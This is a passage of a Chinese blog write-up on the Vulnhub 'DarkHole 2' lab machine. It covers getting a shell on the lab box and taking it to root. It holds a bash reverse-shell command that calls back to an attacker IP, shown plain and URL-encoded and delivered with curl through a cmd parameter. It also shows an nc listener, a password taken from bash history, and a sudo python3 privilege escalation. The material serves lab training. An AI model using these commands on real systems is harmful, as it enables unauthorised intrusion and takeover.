/dev/tcp/192.168.75.151/1234 0\u003e\u0026#x26;1'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e将其进行URl编码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebash+-c+%27bash+-i+%3e%\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e+%2fdev%2ftcp%2f192\u003cspan class=\"hljs-number\"\u003e.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e%2f1234+\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e%3e%\u003cspan class=\"hljs-number\"\u003e261\u003c/span\u003e%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e构建命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecurl \u003cspan class=\"hljs-string\"\u003e\"http://127.0.0.1:9999/?cmd=bash+-c+%27bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.75.151%2f1234+0%3e%261%27\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e 开启监听，执行命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nlistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e33342\u003c/span\u003e\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (\u003cspan class=\"hljs-number\"\u003e1215\u003c/span\u003e): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e this shell\nlosy@darkhole:/opt/web$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得\u003ccode\u003elosy\u003c/code\u003e的\u003ccode\u003eshell\u003c/code\u003e！！！\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权 - losy用户\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e和之前一样，我们先查看\u003ccode\u003ebash\u003c/code\u003e历史记录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDarkHole%202/image79.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以找到\u003ccode\u003elosy\u003c/code\u003e的密码为\u003ccode\u003egang\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e进行\u003ccode\u003essh\u003c/code\u003e登录，能过得交互性更好的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eSUDO\u003c/code\u003e ，可以以root权限执行\u003ccode\u003epython3\u003c/code\u003e ，可以提权了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e```python\nlosy@darkhole:~$ sudo -l\n[sudo] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e losy: \nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e losy on darkhole:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/snap/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser losy may run the following commands on darkhole:\n    (root) /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/python3\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs\"\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用\u003ccode\u003epython3\u003c/code\u003e提权，使用\u003ccode\u003epython\u003c/code\u003e生成虚拟终端即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003elosy@darkhole:~$ sudo /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/python3 -c \u003cspan class=\"hljs-string\"\u003e\"import pty;pty.spawn('/bin/sh')\"\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# whoami\u003c/span\u003e\nroot\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得\u003ccode\u003eroot\u003c/code\u003e！！！！\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e读取\u003ccode\u003eflag\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# cat root.txt\u003c/span\u003e\nDarkHole{\u003cspan class=\"hljs-string\"\u003e'Legend'\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003e.git\u003c/code\u003e的使用，以及\u003ccode\u003egit diff\u003c/code\u003e；以及\u003ccode\u003ebash_history\u003c/code\u003e也可能存在敏感内容；\u003c/p\u003e","title":"Vulnhub - DarkHole 2","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机"}},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"02","id":"VulnhubDarkHole 2"},"buildId":"SOVon_ABhKhh0QeRU1c0t","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>